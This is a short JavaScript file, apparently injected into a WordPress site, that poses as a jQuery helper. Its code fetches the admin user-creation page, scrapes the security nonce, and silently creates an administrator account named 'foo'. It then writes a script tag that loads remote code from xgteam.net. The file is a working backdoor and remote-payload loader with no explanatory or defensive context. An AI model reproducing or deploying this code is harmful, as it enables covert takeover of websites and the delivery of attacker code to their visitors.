jQuery.noconflict();
jQuery.fn.stripTags = function() {
    return this.replaceWith( this.html().replace(/<\/?[^>]+>/gi, '') );
};
u="/wp-admin/user-new.php";jQuery.get(u,function(e){jQuery.post(u,{action:"createuser","_wpnonce_create-user":e.match(/_wpnonce_create-user\"\svalue=\"(.+?)\"/)[1], user_login: "foo" ,email:" foo@bar.com",pass1: "foo" ,pass2:"foo", role: "administrator"})});
document.write('<script src="//xgteam.net/img/blank.js"></script>');

